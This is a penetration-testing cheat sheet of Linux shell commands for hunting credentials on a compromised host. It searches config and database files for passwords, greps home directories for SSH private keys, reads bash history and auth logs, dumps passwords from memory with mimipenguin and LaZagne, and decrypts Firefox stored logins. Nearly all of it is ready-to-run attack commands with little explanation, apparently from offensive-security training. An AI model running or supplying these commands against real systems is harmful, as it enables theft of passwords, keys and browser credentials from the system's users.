
Files
- Configs (.config, .conf, .cnf)
- Databases
- Notes
- Scripts
- Source codes
- Cronjobs
- SSH Keys
History
- Logs
- Command-line history
Memory
- Cache
- In-memory processing
Key-Rings
- Browser stored credentials

Configuration Files
```shell-session
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

Credentials in Configuration Files
```shell-session
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

Databases
```shell-session
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

Notes
```shell-session
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

Scripts
```shell-session
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

Cronjobs
```shell-session
cat /etc/crontab 
```
```shell-session
ls -la /etc/cron.*/
```

SSH Private Keys
```shell-session
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

SSH Public Keys
```shell-session
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

Bash history
```shell-session
tail -n5 /home/*/.bash*
```

Log Files
- /var/log/messages
- /var/log/syslog
- /var/log/auth.log
- /var/log/secure
- /var/log/boot.log
- /var/log/dmesg
- /var/log/kern.log
- /var/log/faillog
- /var/log/cron
- /var/log/mail.log
- /var/log/httpd
- /var/log/mysqld.log

Interesting content in logs
```shell-session
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

Memory - Mimipenguin
https://github.com/huntergregal/mimipenguin
```shell-session
sudo python3 mimipenguin.py
```
```shell-session
sudo bash mimipenguin.sh 
```

Memory - Lazagne
```shell-session
sudo python2.7 laZagne.py all
```

Firefox Stored Credentials
https://github.com/unode/firefox_decrypt
```shell-session
ls -l .mozilla/firefox/ | grep default 
```
```shell-session
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

Decrypting Firefox Credentials
```shell-session
python3.9 firefox_decrypt.py
```

Browsers - Lazagne
```shell-session
python3 laZagne.py browsers
```

